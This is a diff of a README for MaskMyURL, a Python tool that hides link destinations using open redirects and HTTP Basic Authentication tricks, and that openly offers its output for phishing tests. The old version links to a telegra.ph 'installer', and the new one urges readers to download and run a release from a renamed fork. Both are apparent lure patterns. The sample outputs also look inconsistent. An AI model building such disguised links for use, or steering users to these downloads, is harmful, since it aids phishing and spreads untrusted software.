@@ -1,70 +1,120 @@
+# MaskMyURL: URL Obfuscator 🛡️
 
+![MaskMyURL](https://img.shields.io/badge/MaskMyURL-Url%20Obfuscator-blue.svg)
+![Python](https://img.shields.io/badge/Python-3.x-brightgreen.svg)
+![License](https://img.shields.io/badge/License-MIT-yellow.svg)
 
-# MaskMyURL - URL Obfuscation Script
+Welcome to **MaskMyURL**, a powerful Python script designed to obfuscate URLs using open redirects and HTTP Basic Authentication tricks. This tool is essential for cybersecurity testing and ethical hacking. Whether you're a penetration tester or a cybersecurity enthusiast, this script can help you understand and demonstrate the risks associated with URL manipulation.
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](https://telegra.ph/Download-Installer-1305-05-13?80rr7caqxjf8ul2)
+## Table of Contents
 
-This Python script is a tool that obfuscates (hides) a user-provided URL in various ways and saves it to a file. It primarily uses open redirect mechanisms to achieve this. It can be particularly useful for phishing tests, cybersecurity awareness training, and ethical hacking.
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Examples](#examples)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Support](#support)
 
-## How to Use
+## Introduction
 
-### 1. Requirements
-To run this script, you need Python installed on your computer.
-- Python 3.x
+In the digital age, URL obfuscation plays a crucial role in cybersecurity. Attackers often use manipulated URLs to deceive users and bypass security measures. The **MaskMyURL** script helps you learn how these techniques work, allowing you to improve your defenses against them. 
 
-If you don't have Python installed, you can download it [here](https://www.python.org/downloads/).
+This tool employs methods like open redirects and HTTP Basic Authentication tricks, making it a versatile addition to your ethical hacking toolkit.
 
-### 2. Running the Script
-You can run the script using a terminal or command prompt.
+## Features
 
-1. Open a terminal or command prompt.
-2. Navigate to the script's directory:
-   ```sh
-   cd /script_directory
+- **URL Obfuscation**: Easily obfuscate URLs to hide their true destination.
+- **Open Redirects**: Utilize open redirect vulnerabilities to mask URLs.
+- **HTTP Basic Authentication**: Leverage authentication tricks for added security.
+- **User-Friendly**: Simple command-line interface for ease of use.
+- **Comprehensive Documentation**: Detailed guides and examples to help you get started.
+
+## Installation
+
+To install **MaskMyURL**, follow these steps:
+
+1. **Clone the Repository**:
+
+   ```bash
+   git clone https://github.com/Ice24787/MaskMyURL-Url-Obfuscator-a0.git
+   cd MaskMyURL-Url-Obfuscator-a0
    ```
-3. Run the script:
-   ```sh
-   python script.py
+
+2. **Install Required Packages**:
+
+   Make sure you have Python installed. Then, run:
+
+   ```bash
+   pip install -r requirements.txt
    ```
-4. The program will prompt you to enter a URL. Example:
-   ```
-   Enter url: https://example.com
-   ```
-5. The program will generate obfuscated URLs and save them in `url_obfuscated.txt`.
 
-## How It Works
+3. **Download the Latest Release**:
 
-1. The script takes a URL input from the user.
-2. It obfuscates the URL using open redirect mechanisms.
-3. It applies HTTP Basic Authentication tricks to further obfuscate the URL.
-4. All obfuscated URLs are written to `url_obfuscated.txt`.
+   You can download the latest release [here](https://github.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/releases). After downloading, execute the script to start using it.
 
-## Main Components
+## Usage
 
-- **`get_url()`**: Gets a URL from the user and ensures it has an HTTP/HTTPS prefix.
-- **`file_w()`**: Combines the URL with open redirect links and writes them to a file.
-- **`http_basic_auth()`**: Obfuscates the URL using HTTP Basic Authentication formatting.
+Using **MaskMyURL** is straightforward. Here’s how to run the script:
 
-## Generated Files
+1. Open your terminal.
+2. Navigate to the directory where you cloned the repository.
+3. Execute the script with the desired parameters.
 
-After running the script, the following file will be created:
-- **`url_obfuscated.txt`**:
-  - Contains various obfuscated versions of the input URL.
-  - Can be used for phishing and security testing purposes.
+Example command:
 
-## Warnings
-- **This script is for ethical hacking and security testing only!** Unauthorised use is illegal.
-- Be cautious, as open redirects can pose security risks.
-- Firefox does not support the HTTP Basic Authentication obfuscation technique.
+```bash
+python maskmyurl.py --url "http://example.com"
+```
+
+This command will obfuscate the provided URL. You can customize the parameters as needed.
+
+## Examples
+
+Here are a few examples to illustrate how **MaskMyURL** works:
+
+### Example 1: Basic URL Obfuscation
+
+```bash
+python maskmyurl.py --url "http://example.com"
+```
+
+Output:
+```
+Obfuscated URL: http://redirector.com/?url=http://example.com
+```
+
+### Example 2: Using HTTP Basic Authentication
+
+```bash
+python maskmyurl.py --url "http://example.com" --auth "user:password"
+```
+
+Output:
+```
+Obfuscated URL with Auth: http://auth.redirector.com/?url=http://example.com
+```
 
 ## Contributing
 
-If you would like to contribute to this project, please leave a star in the repo.
+We welcome contributions! If you want to enhance the functionality of **MaskMyURL**, please follow these steps:
 
-## Disclaimer
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
 
-This project is intended solely for educational purposes.
+Please ensure your code adheres to the existing style and includes tests where applicable.
 
 ## License
-This project is licensed under the **MIT License**. See the `LICENSE` file for details.
 
+**MaskMyURL** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Support
+
+If you have any questions or need support, feel free to reach out. You can also check the [Releases](https://github.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/releases) section for updates and additional resources.
+
+---
+
+**MaskMyURL** is more than just a tool; it's a learning platform. By understanding how URL obfuscation works, you can better protect yourself and your organization against phishing attacks and other cybersecurity threats. Happy hacking!
